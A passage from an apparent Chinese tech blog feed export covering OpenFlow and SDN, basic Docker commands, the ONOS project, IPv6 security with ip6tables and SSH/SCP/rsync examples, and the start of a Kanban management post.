交换机或者其它解决方案也存在版本支持不尽相同的情况，版本兼容的问题需要尤其关注。 OpenFlow V1.0 (2009) OpenFlow V1.1 (2011)Ethernet/IP only. Single Flow Table. Did not cover MPLS, Q-in-Q, ECMP, and efficient Multicast. OpenFlow V1.2 (2011)IPv6 Support: Matching fields include IPv6 source address, destination address, protocol number, traffic class. ICMPv6 type, ICMPv6 code, IPv6 neighbor discovery header fields, and IPv6 flow labels.TLV MatchingMultiple controller OpenFlow V1.3 (2012)IPv6 extension headers: Can check if Hop-by-hop, Router, Fragmentation, Destination options, Authentication, Encrypted Security Payload (ESP), unknown extension headers are presentMPLS Bottom-of-Stack bit matchingMAC-in-MACMultiple channels between switch and controller OpenFlow V1.4 (2013)Optical ports: Configure and monitor transmit and receive frequencies of lasers and their powerImproved Extensibility: Type-Length-Value (TLV) encodings at most placesExtended Experimenter Extension API: Can easily add ports, tables, queues, instructions, actions, etc. OpenFlow的工作原理 OpenFlow is a communications protocol. OpenFlow 提供了一个在 SDN 控制器和网络设备（如交换机）之间通讯的标准协议。他允许由 SDN 控制器下发到转发规则（forwarding rules）、安全规则（security rules）到底层网络交换机，完成路由决策、流量控制。OpenFlow 协议相当于一种共同语言，所以SDN 控制器和交换机都需要实现OpenFlow 协议，以便他们能够理解 OpenFlow 消息（message）。 SDN 控制器和交换机之间需要建立通讯连接才能进行配置、管理和监控。通讯连接基于 TCP （或者 TLS）协议之上，监听 6653 端口 。初始化模式：1）网络交换机发起，发送连接请求到控制器 2）控制器发起，交换机需要设置被动模式（ passive mode）开启监听。 无论使用哪种模式，一旦通讯连接建立，OpenFlow 消息将通过 TCP／TLS 连接传递。 基于 OpenFlow 消息，该协议还可以支持网络交换机监控：为了监控网络交换机，OpenFlow 协议提供了从交换机抓取网络统计信息、事件消息的请求／响应报文，方便控制器获得从交换机一侧感知人工操作和失败信息的能力,包括流移除事件，端口状态 UP/DOWN 变化等。为了能够支持第三方厂商可以在 OpenFlow 交换机上执行特定的任务，OpenFlow 协议提供可扩展的自定义消息结构，允许控制器和交换机之间传递信息。那是怎样的 OpenFlow 被许多SDN应用程序用来提供简单的网络控制和管理解决方案。 流表（Flow Table）网络交换机将 SDN 控制器下发的所有规则存储于流表（flow table），例如： ACL 策略（configuring ACL rules） 安全策略（security policy rules） QoS 限速策略（QoS rate limiting bandwidth rules） 路由策略（routing rules） 端口镜像策略（port mirroring rules） 包变更策略（packet modification rules） 大体上，流（flow）中包含三种类型的信息： Match fields：他们将定义在包头字段：L2（源目的地 以太网地址，VLAN ID，VLAN优先级等），L3（IPv4和IPv6 源目的地 地址、协议类型、DSCP、等），L4领域（TCP/UDP/SCTP源目的端口），ARP ICMP字段，字段，MPLS域等等。 Actions：他们将定义一个包是否符合特定条件。例如丢弃（drop），转发到交换机的指定端口，修改数据包（push/pop VLAN ID，push/pop 标签，递增/递减IP TTL），转发到特殊端口的序列等。 计数器：记录由多少数据包匹配到当前flow OpenFlow 协议定义了多种消息来完成交换机和控制机通讯，例如： 连接设置消息（connection setup messages) 配置消息（configuration messages) 交换机统计信息消息（switch statistics messages) 连接监测消息（keep-alive messages) 异步事件消息（asynchronous events messages) 发生错误消息（error messages) 支持 OpenFlow 的开源交换机：Open vSwitch OpenFlow Switches including Open vSwitch. 市场中支持 OpenFlow 的硬件交换机包括 VMware 推出的vSwitch、vDS等虚拟交换机，Cisco与VMware合作发布了基于VMware kernel API开发的分布式虚拟交换机Nexus 1000V（功能对应于VMware的vDS），Citrix 迫于Open vSwitch快速追赶，推出了的Distributed Virtual Switch解决方案，这些方案都是收费的。 除了硬件交换机还可以通过软件支持并实现虚拟机互联，Open vSwitch(Open Source Virtual Switch)就是是一款基于软件实现的开源虚拟交换机。它采用 C 语言编写，遵循 Apache 2.0 许可。 Open vSwitch 的周边生态情况： 支持的操作系统（Linux, Ubuntu, Debian，FreeBSD 和 NetBSD） 支持云计算平台管理系统集成，例如：OpenStack, openQRM, OpenNebula, 和 oVirt 支持虚拟化部署，共享硬件资源（ hypervisor ） 支持云平台 Xen XenServer 6.0 ，也支持 Proxmox VE, VirtualBox, Xen KVM 提供开发工具包：Data Plane Development Kit (DPDK) 接口编程语言支持：C 、Python 支持虚拟机通讯／监控流量统计信息，例如 NetFlow(Cisco，RFC 3954)、sFlow（RFC 3176）、NetStream（Huawei）、IPFIX（RFC 7011）,详见 浅谈基于数据分析的网络态势感知 。 SPAN（Switched Port Analyzer ）, RSPAN（ Remote Switch Port Analyzer）：可以发送一份流量的拷贝给连接安全设备的交换机端口 示例：Open vSwitch 通过命令和控制器建立初始化连接（TCP），控制器 IP （192.168.56.101） 端口（6653）：1ovs-vsctl set-controller &lt;sampleBridgeName&gt; tcp:192.168.56.101:6653 Intel 拥有一个自己的 Open vSwitch 版本，OpenStack 在2011年启动 Quantum 项目，通过引入了Open vSwitch 发展 Open Stack Network 。随着 OpenStack 社区的快速壮大，Open vSwitch 在虚拟交换机的领先优势逐步确立。 Discuss 资讯 | Google’s next OpenFlow challenge: taking SDNs to the consumer,Stacey Higginbotham Apr 17, 2012 扩展阅读SDN技术专题 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow SDN 技术指南（三）：SDN Controller SDN 技术指南（四）：Open vSwitch SDN 技术指南（五）：NFV SDN 技术指南（六）：OpenStack or Kubernetes ? SDN 技术指南（七）：标准化组织 SDN 技术指南（八）：案例教学 SDN技术指南（十）：在线课程推荐 网络编程专题 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 网络安全专题 Cyber-Security: IPv6 &amp; Security Cyber-Security|香港拟增设网络安全与科技罪案总警司 云计算专题 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献 David Mahler: Introduction to OpenFlow | Youtube TR-535 ONF SDN Evolution,VERSION 1.0,2016-09-08 TS-025 ONF OpenFlow Switch Specification-Version 1.5.1 (Protocol version 0x06),March 26,2015 Tarun Thakur Software Defined Networking (SDN) explained for beginners Software Defined Networking (SDN) - Architecture and role of Openflow 基于 Open vSwitch 的 OpenFlow 实践 | IBM@developerworks,2014]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：Docker]]></title>
    <url>%2F2017%2F08%2F21%2FDevOps-Docker%2F</url>
    <content type="text"><![CDATA[摘要 Docker ABC:常用命令、自定义制作、发布 This article is part of an Virtualization Technology tutorial series. Make sure to check out my other articles as well: 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC ABC Docker 常用命令 Docker 自定义制作 Docker 常用命令1234567891011121314151617181920212223242526272829303132$ docker version$ docker info# service 命令的用法$ sudo service docker start# 列出本机的所有 image 文件。$ docker image ls# 删除 image 文件$ docker image rm [imageName]# Hello World$ docker image pull hello-world$ docker container run hello-world# 启动已经生成、已经停止运行$ docker container start [containerID]# 终止容器 [SIGTERM]$ docker container stop [containerID]# 终止容器 [SIGKILL]$ docker container kill [containID]# 列出本机正在运行的容器$ docker container ls# 列出本机所有容器，包括终止运行的容器$ docker container ls --all# 进入一个正在运行的容器$ docker container exec -it [containerID] /bin/bash# 将文件从容器拷贝到本机$ docker container cp [containID]:[/path/to/file] .$ docker container logs Docker 自定义制作 项目根目录创建 .dockerignore 文件(需要忽略打包的文件) 12.gitlogs 创建 Dockerfile 文件 构建 image 文件 12345678910111213141516171819202122232425262728293031323334## You need to add a dot（"docker build" requires exactly 1 argument(s)）$ docker image build -t gospider .Sending build context to Docker daemon 12.47MBStep 1/4 : FROM node:8.48.4: Pulling from library/nodeaa18ad1a0d33: Downloading [===============&gt; ] 16.18MB/52.6MB90f6d19ae388: Download complete94273a890192: Downloading [================&gt; ] 14.13MB/43.23MBc9110c904324: Downloading [===&gt; ] 10.25MB/134.7MB788d73c0fb6b: Waitingf221bb562f24: Waiting14414a6a768d: Waitingaf6d2b2ad991: Waiting......14414a6a768d: Pull completeaf6d2b2ad991: Pull completeDigest: sha256:080488acfe59bae32331ce28373b752f3f848be8b76c2c2d8fdce28205336504Status: Downloaded newer image for node:8.4 ---&gt; 386940f92d24Step 2/4 : COPY . /app ---&gt; 5dea8aef5c00Step 3/4 : WORKDIR /appRemoving intermediate container de21dc94fd49 ---&gt; c04960e1036bStep 4/4 : EXPOSE 3001 ---&gt; Running in 7e5efe5e0b43Removing intermediate container 7e5efe5e0b43 ---&gt; bcadd82be353Successfully built bcadd82be353Successfully tagged gospider:latest$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEgospider latest bcadd82be353 7 minutes ago 685MB 制作容器docker container run 从 image 文件生成容器。可选参数： -p 参数：p1:p2 [容器端口]映射到[本机端口] imagename /bin/bash：保证用户可以使用 Shell 1234567891011121314151617$ docker container run -it gospider /bin/bashroot@d2d7bfd9f4c1:/app#root@d2d7bfd9f4c1:/app#root@d2d7bfd9f4c1:/app# lsDockerfile gmof_caipiao_month.go gmof_cdc_epide_month.go publish ttank_zyuc_handle.gocharset.go gmof_caipiao_month_spider.go gmof_cdc_epide_month_spider.go test ttank_zyuc_register.godbutils_csv.go gmof_casad_info_spider.go gmof_person.go ttank-echarts zyuc_task_info.godbutils_kafka.go gmof_casad_list.go gmof_person_region.go ttank.go zyuc_task_spider.godbutils_pg.go gmof_casad_list_spider.go gmof_person_region_spider.go ttank_gmof_handle.go gmof_caipiao_list.go gmof_cdc_epide_list.go kafka ttank_gmof_register.gogmof_caipiao_list_spider.go gmof_cdc_epide_list_spider.go ops ttank_tasks.goroot@d2d7bfd9f4c1:/app#root@d2d7bfd9f4c1:/app# iduid=0(root) gid=0(root) groups=0(root)root@d2d7bfd9f4c1:/app# whoamiroot Docker 发布 注册账户：hub.docker.com 或 cloud.docker.com 登录1234567891011121314151617181920212223$ docker loginLogin with your Docker ID to push and pull images from Docker Hub.If you don\'t have a Docker ID, head over to https://hub.docker.com to create one.Username: riboseyimPassword:Login Succeeded# 为本地的 image 标注用户名和版本。$ docker image tag [imageName] [username]/[repository]:[tag]# 发布$ docker image push riboseyim/gospiderThe push refers to repository [docker.io/riboseyim/gospider]db602e58edca: Pushedc5b2ac536264: Mounted from library/node6c08a5b7d8f4: Mounted from library/node50867bb8f5d7: Mounted from library/node72d6c6f0ea06: Mounted from library/node8686c6b8d999: Mounted from library/node44b57351135e: Mounted from library/node00b029f9aa09: Mounted from library/node18f9b4e2e1bc: Mounted from library/nodelatest: digest: sha256:4388ba2cc83adc0d1e9b3ca4c0b273f5812ad6365a36aeef33ff87d62b236d5d size: 2217 Docker 构建 A tool for building/building artifacts from source and injecting into docker images Examples The Ultimate Guide to Writing Dockerfiles for Go Web-apps Docker 安全 Cyber-Security:Linux容器安全的十重境界1.容器操作系统与多租户2.容器内容（使用可信源）3.容器注册 (容器镜像加密访问)4.构建过程安全5.控制集群中可部署的内容6.容器编排：加强容器平台安全7.网络隔离8.存储9.API 管理, 终端安全和单点登录 (SSO)10.角色和访问控制管理 Docker 网络 docker 容器网络方案：calico 网络模型 | Cizixs Docker 监控 搭建Docker监控框架的理论与范例 | 2016-07-22 穆寰 InfoQ Docker 参考书 Docker 入门教程 Docker — 从入门到实践 扩展阅读DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 Quick Guide on Docker Utilities, Daemon and its other capabilities How to Remove Docker Images, Networks, Containers and Volumes A fast and easy Docker tutorial for beginners (video series) Docker 微服务教程 在 Mac 上跳舞的容器 — Docker | 2016-09-06 池建强 MacTalk AgentNEO 架构简介 | 07 May 2018 A Practical Introduction to Container Terminology Why Docker is Not Yet Succeeding Widely in Production,2015 | Simon Hørup Eskildsen Dockercon Talk | Resilient Routing and Discovery | Simon Hørup Eskildsen 数据库不适合Docker及容器化的7大原因 | 2017-02-14 Mikhail Chinkov 高可用架构 Docker, Inc is Dead | Posted on December 30, 2017 (Last modified on February 9, 2018) 关于Docker实际采用情况的八个惊人真相 | 2016-06-22 云头条 Open-sourcing gVisor, a sandboxed container runtime | Wednesday, May 2, 2018 A Practical Introduction to Container Terminology]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN技术指南：Open Network Operating System]]></title>
    <url>%2F2017%2F08%2F18%2FSDN-ONOS%2F</url>
    <content type="text"><![CDATA[摘要 Samsung 主办 ONOS Build 2017 Google 加入CORD ONOS vs. OpenDaylight ONOS source code, written in Java ONOS Architecture Samsung 主办 ONOS Build 2017原文：Samsung Hosts ONOS Build 2017 and Fuels SDN Innovation 三星Samsung将于 9月 20-22 在韩国首尔的研发中心主办 ONOS Build 2017 。 开放网络操作系统(ONOS , Open Network Operating System) 社区在全世界各个地区快速发展，ONOS Build 2017 是开放网络基金会（ONF，Open Networking Foundation）组织的大型开发者大会，专注于 ONOS 项目的研发与推广工作，将于 2017 年 9 月 20 日- 22日在韩国首尔的三星研发中心举办。 本次年度活动将联合200多名开发商和贡献者一起分享，学习，调整，规划，和PK。大会将提供 ONOS 专家主题演讲，人们可以通过社区展示活动了解相关的工作信息，这将是一次演示汇报的 SDN 科技博览会 以及一次编程马拉松活动。我们也将了解到三星Samsung，作为开放网络基金会的合作伙伴之一，为什么投资 ONOS 建设。 为什么三星投资主办 ONOS 大会 ?三星认为，通过开源社区的努力，ONS 项目作为组织的核心将铺平道路、加速革新。作为一家领先的网络解决方案提供商，三星很高兴能帮助那些正在推动创新并将SDN技术引入全球电信网络的开发人员。 什么三星投资 ONOS 项目 ?ONOS 的目标是通过 SDN 的方式达到运营商级的性能指标，包括服务保证，可靠性和可扩展性和高性能。三星相信 ONOS 项目在实现传统网络转向灵活和可扩展系统方面以及走在前列，将使运营商能够更有效地运行他们的网络，为即将到来的5G 时代做好准备。三星一直在积极地促成和加速塑造下一代网络服务，基于 ONOS 项目的开源 SDN 和网络虚拟化。我们相信三星的贡献将有助于满足运营商在电信领域提供领先的5G服务的要求。 三星参与 ONOS 项目多久了 ?三星在 2014 年基于现成的 ONOS 项目开发了首个商业的 SDN 产品，并且在 2016年作为董事会成员加入 ONOS 项目。自从加入该项目，三星一直积极促进每个版本的发展，和其他运营商密切合作开发商业级的 SDN 解决方案。借助于大量具备丰富的 SDN 工作经验开发者、对电信网络整体架构的深刻理解，三星正在社区扮演一个社区规范主要贡献者的角色，有助于在市场中提升相关技术可用性。 ONOS Build 愿景ONOS 大会是一个年度会议，将在世界不同地区举行，连接来自不同背景和行业的全球开发者。今年，我们邀请创新者到亚洲为亚太地区的学术和商业生态系统注入新的活力。此外，该活动将成为开发人员在SDN技术及应用中促进和分享其成果的平台。与会者通过年度共享，参与公开讨论，将增加创新 SDN 商业解决方案的水平，有助于SDN发展。最后，全球许多运营商将出席 ONOS 大会。通过连接运营商，我们希望我们能与开发者分享 SDN 的愿景和技术进步。这将极大地改变行业，帮助我们走向更大的网络的可能性。 ONOS 2017 议程ONOS 2016 大会是首次建立一个强大的 SDN 技术基础的活动。近一年以来，有越来越多的移动运营商愿意将技术融入他们的网络。 ONOS 2017 大会将在电信行业参与者感知到快速变化的背景下召开的，将推动全球电信市场发展商业化的运营商级 SDN 。从内容上讲，今年的活动将持续3天，为与会者提供额外一天的对话会议，让他们深入了解彼此的技术并展示工作成果。最后一天，还将会有旨在介绍 CORD （Central Office Re-Architected as a Data Center）项目的相关进展。 ONOS Build 2017 Schedule相关资讯Google 加入CORD2016年7月26日，CORD 项目宣布成为Linux基金会下的一个独立的开源项目，Google、Radisys以及三星电子宣布加入该项目。CORD的愿景是为规模化的数据中心服务，CORD 创建了两个控制平面：一个使用ONOS控制器，负责网络服务；另外一个使用新的 CORD 操作系统 — XOS，管理VNFs，该操作系统将一切都看作服务。 ONOS vs. OpenDaylightONOS 的第一个版本由 Open Networking Lab (ON.Lab) 在2014年贡献到社区（源码用 Java 编写），2015年10月, ONOS 项目 作为 合作项目（collaborative） 加入 Linux Foundation。 OpenDaylight (ODL) 由 Linux Foundation 创建。两者在推动 SDN 的设计和目标上非常相似，主要是支持者和合作伙伴不同。ONOS 更倾向于网络运营商，更关注提供更好的整体网络性能；ODL更倾向于数据中心网络，设计上注重融合传统网络与 SDN 。 What is the OpenDaylight Project (ODL)? 扩展阅读SDN技术专题 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow SDN 技术指南（三）：SDN Controller SDN 技术指南（四）：Open vSwitch SDN 技术指南（五）：NFV SDN 技术指南（六）：OpenStack or Kubernetes ? SDN 技术指南（七）：标准化组织 SDN 技术指南（八）：案例教学 SDN技术指南（十）：在线课程推荐 网络编程专题 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 网络安全专题 Cyber-Security: IPv6 &amp; Security Cyber-Security|香港拟增设网络安全与科技罪案总警司 云计算专题 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献 Wiki: ONOS OpenCORD.org sdnlab.com: AT&amp;T CORD架构解读 sdnlab.com: Google加入CORD OpenNetworking.org: ONF Overview techtarget.com: ONOS (Open Network Operating System)]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络协议：IPv6 与网络安全]]></title>
    <url>%2F2017%2F08%2F09%2FProtocol-IPv6%2F</url>
    <content type="text"><![CDATA[概要 IPv6 Overview IPv6 &amp; Cyber-Security:IPsec,TLS/SSL, NAT,Source routing IPv6 &amp; Linux Security:iptables vs ip6tables,SSH/SCP/Rsync IPv6IPv6(Internet Protocol version 6)是互联网协议的最新版本，用于分组交换互联网络的网络层协议，旨在解决IPv4地址枯竭问题。IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。例如：2001:0db8:85a3:08d3:1319:8a2e:0370:7344 是一个合法的IPv6地址。 IPv6 报文包格式定义：RFC 1883中定义的原始版本，RFC 2460中描述的现在提议的标准版本。 IPv6地址分类 单播地址（unicast）：单播地址标示一个网络接口，协议会把送往地址的数据包送往给其接口。单播地址包括可聚类的全球单播地址、链路本地地址等。 多播地址（multicast）：多播地址也称组播地址。多播地址也被指定到一群不同的接口，送到多播地址的数据包会被发送到所有的地址。 任播地址（anycast）：Anycast 是 IPv6 特有的数据发送方式，它像是IPv4的Unicast（单点传播）与Broadcast（多点广播）的综合。 Anycast 像 IPv4 多点广播（Broadcast）一样，会有一组接收节点的地址栏表，但指定为Anycast的数据包，只会发送给距离最近或发送成本最低（根据路由表来判断）的其中一个接收地址，当该接收地址收到数据包并进行回应，且加入后续的传输。该接收列表的其他节点，会知道某个节点地址已经回应了，它们就不再加入后续的传输作业。以目前的应用为例，Anycast地址只能分配给路由器，不能分配给电脑使用，而且不能作为发送端的地址。 IPv6 &amp; Cyber-Security对我们网络的攻击来自各种各样的来源：社会工程（Social Engineering）、粗心、垃圾邮件、网络钓鱼、操作系统漏洞、应用程序漏洞、广告网络、跟踪和数据收集、服务提供商窥探等。作为一个新兴的网络协议，安全问题同样无法避免。 IPsec/TLS/SSL/SSHIPsec（网际网络安全协议，Internet Protocol Security，RFC 4301、RFC 4309 ），旨在在网络层为IP分组提供安全服务，包括访问控制、数据完整性、身份验证、防止重放和数据机密性。IPsec原本是为IPv6开发，但是在IPv4中已被大量部署。最初，IPsec是IPv6协议组中不可少的一部分，但现在是可选的。 在传输模式下，IPsec在IP报头和高层协议之间插入一个报头，IP报头与原始IP报头相同，只是IP协议字段被改为ESP或者AH，并重新计算IP报头的校验和。IPsec假定IP端点是可达的，源端头不会修改IP报头中的目标IP地址。IPsec 工作在网络层。其它加密协议如 TLS/SSL 和 SSH，工作在传输层之上，是针对具体应用的。 NAT = Security ? NAT is not and never has been about security. NAT(Network Address Translation) 是一种在IP数据包通过路由器或防火墙时重写来源IP地址或目的IP地址的技术.NAT 延长了 IPv4的寿命。它的本意是通过地址伪装，阻止外部网络主机的恶意活动，阻止网络蠕虫病毒来提高本地系统的可靠性，阻挡恶意浏览来提高本地系统的私密性。另外，它也为UDP的跨局域网的传输提供了方便。很多防火墙都NAT功能，它使防火墙变成有状态的，检查所有的流量、跟踪哪些数据包进入您的内部主机，并将多个私有内部地址重写到一个外部地址。它在外部网关上创建一个单点故障源，并为拒绝服务（DoS）攻击提供了一个简单的目标。NAT有它的优点，但安全不是其中之一。 Source routingSource routing 允许发送方控制转发，而不是将其留给任何一个包通过的路由器，通常是OSPF（Open Shortest Path First，开放最短路径优先）。Source routing 有时用于负载平衡，和管理VPN（Virtual Private Network，虚拟专用网络），所以，Source routing 并不是 IPv6 带来的特性，但是提出了许多安全问题。你可以用它来探测网络，获取信息，绕过安全设备。路由报头0型（RH0）是使源路由的IPv6扩展报头，它一直受到抨击，因为它使一中非常聪明的DoS攻击被放大，在两个路由器之间的反弹包直到它们超载及带宽耗尽。 大就是强 ？有些人认为IPv6地址空间如此之大，为网络扫描提供了一种防御。这是一种错误的观念。我们确实有潜在的庞大地址资源可供应用，但是我们倾向于在可预见的范围组织我们的网络。硬件在变得廉价的和强大，云计算资源的快速发展在惠及企业的同时，也降低了攻击方的门槛和成本（黑客、黑产）。计算机网络的复杂性决定了挫败恶意网络扫描的困难很大，包括在IPv6网络中进行监测辨别哪些属于本地访问、哪些不是，IPv6 控制访问的问题在于，它的管理能力要求超过了其它任何协议。传统的防御工具和方法论都有待更新。 IPv6 &amp; Linux Securityiptables &amp; ip6tablesip6tables命令和iptables一样，都是Linux中防火墙软件。 123456789101112131415##Block All IPv6$ vi /etc/sysctl.conf:net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1##load your changes:$ sudo sysctl -pnet.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1##Test$ ping6 -c3 -I eth0 fe80::f07:3c7a:6d69:8d113 packets transmitted, 0 received, 100% packet loss, /time 2999s##Listing$ sudo ip6tables -L# Flushing$ sudo ip6tables -F Example Rules123456789101112131415161718192021222324252627282930313233# ip6tables single-host firewall script# Define your command variablesipt6=/sbin/ip6tables# Flush all rules and delete all chains# for a clean startup$ ipt6 -F$ ipt6 -X# Zero out all counters$ ipt6 -Z# Default policies: deny all incoming# Unrestricted outgoing$ ipt6 -P INPUT DROP$ ipt6 -P FORWARD DROP$ ipt6 -P OUTPUT ACCEPT# Must allow loopback interface$ ipt6 -A INPUT -i lo -j ACCEPT# Reject connection attempts not initiated from the host$ ipt6 -A INPUT -p tcp --syn -j DROP# Allow return connections initiated from the host$ ipt6 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT# Accept all ICMP v6 packets$ ipt6 -A INPUT -p ipv6-icmp -j ACCEPT# Optional rules to allow other LAN hosts access to services. Delete $ipt6 -A INPUT -p tcp --syn -j DROP# Allow DHCPv6 from LAN only$ ipt6 -A INPUT -m state --state NEW -m udp -p udp -s fe80::/10 --dport 546 -j ACCEPT# Allow connections from SSH clients$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT# Allow HTTP and HTTPS traffic$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT# Allow access to SMTP, POP3, and IMAP$ ipt -A INPUT -m state --state NEW -p tcp -m multiport --dport 25,110,143 -j ACCEPT SSH and SCP我们熟悉的文件拷贝工具：SSH, SCP, 和 Rsync 都支持 IPv6，坏消息是他们的语法怪异。 所有 Linux 管理员都知道使用 SSH 和 SCP。 它们在 IPv6 网络中有一些怪异，特别是关于远程地址，一旦你弄明白这个问题就能像过去一样熟练使用 SSH 和 SCP 。默认情况下，sshd 守护进程同时监听 IPv4 和 IPv6 协议，你可以通过 netstat 查看：123456789101112$ sudo netstat -pant|grep sshdtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1228/sshd tcp6 0 0 :::22 :::* LISTEN 1228/sshd## 通过 sshd_config 中的 AddressFamily 选项禁用任何一种协议。禁用 IPv6:## 默认选项为 any ，只允许IPv6 inet6AddressFamily inet## 在客户端方面，通过 IPv6 网络登陆和 IPv4一样登陆、运行命令行以及退出。$ ssh carla@2001:db8::2$ ssh carla@2001:db8::2 backup## 您可以使用链路本地地址访问本地局域网上的主机。## 这有一个无正式文档说明的怪癖，会让你抓狂，但现在你知道它是什么：你必须把你的网络接口名称与远程地址用符号 “%” 连接。$ ssh carla@fe80::ea9a:8fff:fe67:190d%eth0 你也可以简化远程root登录。聪明的管理员禁用root登录ssh，所以你必须登录为一个普通用户，然后换为root用户登录。这不是那么费力，但我们可以用一个命令来完成这一切，系统将在倒数120分钟后停止！这个shutdown将持续打开直到完成运行，所以中途你能改变注意并且用寻常的方式取消shutdown，通过 Ctrl+c。 123456$ ssh -t carla@2001:db8::2 "sudo su - root -c 'shutdown -h 120'"carla@2001:db8::2 password:[sudo] password /for carla:Broadcast message from carla@remote-server## 技巧：强制使用 IPv4 或者 IPv6$ ssh -6 2001:db8::2 SCP是怪异的。你必须在链路本地地址的后面使用符号“%”来指定网络接口，并且将地址用方括号括起来，并避开括号；如果使用全球单播地址则不需要指定网络接口，但是依然需要方括号。123456789$ scp filename [fe80::ea9a:8fff:fe67:190d%eth0]:carla@fe80::ea9a:8fff:fe67:190d password:filename$ scp filename [2001:db8::2]:carla@2001:db8::2 password:filename## 示例：登录到远程主机上的不同用户帐户，指定将文件复制到的远程目录，并更改文件名：scp filename userfoo@[fe80::ea9a:8fff:fe67:190d%eth0]:/home/userfoo/files/filename_2 Rsyncrsync 要求使用各种标点符号封闭远程的 IPv6 地址。与以往一样，请记住源目录中的尾随斜杠，例如 /home/carla/files/ ，表示只复制目录的内容。省略尾随斜杠将复制目录及其内容。尾随斜线并不重要，关键是你的目标目录。12345678##全球单播地址不需要指定网络接口：$ rsync -av /home/carla/files/ &apos;carla@[2001:db8::2]&apos;:/home/carla/stuffcarla@f2001:db8::2 password:sending incremental file listsent 100 bytes received 12 bytes 13.18 bytes/sectotal size is 6,704 speedup is 59.86##使用链路本地地址时必须包含网络接口。$ rsync -av /home/carla/files/ &apos;carla@[fe80::ea9a:8fff:fe67:190d%eth0]&apos;:/home/carla/stuff Master: Carla SchroderCarla Schroder is a self-taught Linux and Windows sysadmin who laid hands on her first computer around her 37th birthday. Her first PC was a Macintosh LC II. Next came an IBM clone–a 386SX running MS-DOS 5 and Windows 3.1 with a 14-inch color display–which was adequate for many pleasant hours of Doom play. Then around 1997 she discovered Red Hat 5.0 and had a whole new world to explore. She is the author of the Linux Cookbook for O’Reilly, and writes Linux how-tos for several computer publications. 《Linux Cookbook》2004,$49.99 《Linux Networking Cookbook》2007,$44.99 《The Book of Audacity》2011,$34.95 扩展阅读参考文献 徐建锋：新贵与遗老续：IPv6的生而不活与IPv4的死而不僵 Carla Schroder@Linux.com:Building IPv6 Firewalls: IPv6 Security Myths Carla Schroder@Linux.com:Remote Sessions Over IPv6 with SSH, SCP, and Rsync Carla Schroder@Linux.com:How to Write iptables Rules for IPv6 Practical Networking for Linux Admins: TCP/IP Practical Networking for Linux Admins: Real IPv6 Practical Networking for Linux Admins: IPv4 and IPv6 LAN Addressing Practical Networking for Linux Admins: IPv6 Routing Cyber Security : TLS / SSL vs IPSec]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈:看板Kanban管理实践]]></title>
    <url>%2F2017%2F08%2F06%2FTeamWork-Kanban%2F</url>
    <content type="text"><![CDATA[摘要Kanban看板是一种可视化生产管理系统，利用看板卡来增强信号量、标记生产过程，促进系统渐进式变化，提高团队协作的效率。 核心理论：流动性、可视化 实践方法：看板设计模式、可视化技巧、平衡群体智慧和个体差异 目标是 提高整个系统的生产能力，不只是提高任务的完成数量。——《凤凰项目 一个IT运维的传奇故事》第 193 页 一、Kanban看板核心理论1、起源Kanban(看板)是一种生产管理系统，起源于1940年代的丰田汽车公司的 TPS (Toyota Production System)。简单来说看板是一系列简单的视觉符号，它的出现是为了达到即时化生产（Just in time，JIT），JIT认为库存会带来成本以及浪费，而不是增加或储存价值，这与传统会计学不同，它鼓励企业逐步消除库存，以便削减生产流程中的成本，在管理中逐渐适应“零库存”的状态。 2、BASIC of Kanban：流动性Cycle Time = Work in Progress / ThroughputKanan 看板系统的基础理论是利特尔法则（ Little’s Law），由MIT （Sloan School of Management）的教授John Little于1961年提出：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。 the relationship between the average number of customers in a store, their arrival rate, and the average time in the store. 根据利特尔法则，跟踪工作及其进展的最重要的目标是：限制在制品（Work in process，WIP），例如尚未完成制造过程的商品，或是停留在库存仓库或是产线上，等待着进一步处理的商品。 高质量地完成工作只有在工作以可持续的节奏流动时才有可能。发现并维持这一节奏只有在在制品小于团队产能的情况下才有可能。— Jim Benson 《Personal Kanban》作者 看板的主要部分是故事卡片（Story 